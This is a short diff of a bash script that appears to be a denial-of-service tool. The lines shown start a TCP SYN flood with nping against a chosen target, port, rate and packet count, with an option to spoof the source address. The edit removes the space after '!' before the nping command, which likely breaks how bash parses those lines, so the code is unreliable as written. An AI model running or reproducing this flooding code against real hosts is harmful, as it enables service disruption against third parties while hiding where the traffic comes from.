@@ -474,8 +474,8 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 		echo "Starting TCP SYN Flood..."
 #begin TCP SYN flood using values defined earlier
 	if 	[ "$SOURCE" = "i" ]; then
-		! nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
-	else ! nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+		!nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+	else !nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
 	fi
 	fi
 }
